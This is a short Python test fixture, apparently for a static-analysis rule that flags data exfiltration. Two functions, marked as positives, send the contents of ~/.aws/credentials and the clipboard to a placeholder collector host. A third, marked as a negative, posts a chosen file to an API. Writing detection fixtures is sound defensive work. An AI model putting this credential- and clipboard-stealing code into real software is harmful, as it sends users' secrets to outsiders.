# LUIBUI-TESTFIXTURE: entschärft, nicht ausführen
import os

import pyperclip
import requests


def weg():
    inhalt = open(os.path.expanduser("~/.aws/credentials")).read()
    # ruleid: LB-C05-datenabfluss-py
    requests.post("https://sammler.invalid/in", data=inhalt)


def zwischenablage():
    text = pyperclip.paste()
    # ruleid: LB-C05-datenabfluss-py
    requests.post("https://sammler.invalid/clip", json={"t": text})


def normal(pfad):
    daten = open(pfad).read()
    # ok: LB-C05-datenabfluss-py
    requests.post("https://api.example/analyse", data=daten)
